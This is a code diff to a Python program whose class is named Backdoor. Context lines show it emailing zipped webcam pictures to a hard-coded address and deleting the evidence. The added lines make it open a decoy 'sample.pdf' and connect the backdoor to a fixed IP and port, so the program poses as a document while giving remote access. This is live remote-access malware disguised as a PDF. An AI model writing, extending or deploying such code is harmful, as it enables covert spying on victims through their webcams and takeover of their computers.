@@ -300,10 +300,21 @@ class Backdoor:
         self.send_mail(self.email, self.password, self.email, f"Webcam pictures for {filename}", subject="Webcam Jack Photos", attach_list=[filename + '.zip'])
         os.remove(filename + '.zip')
 
-while True:
-    port = 8080
+def resource_path(relative_path):
     try:
-        backdoor = Backdoor(socket.gethostbyname(socket.gethostname()), port)
-        break
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
+
+if __name__ == "__main__":
+    file_name = resource_path(os.path.dirname(os.path.abspath(__file__))) + "/sample.pdf"
+    subprocess.Popen('xdg-open ' + file_name, shell=True)
+
+    ip = '192.168.43.19'
+    port = 9876
+    try:
+        print(socket.gethostbyname(socket.gethostname()))
+        backdoor = Backdoor(ip, port)
     except:
-        port += 1
+        print('Disconnecting from {0}:{1}'.format(ip, port))
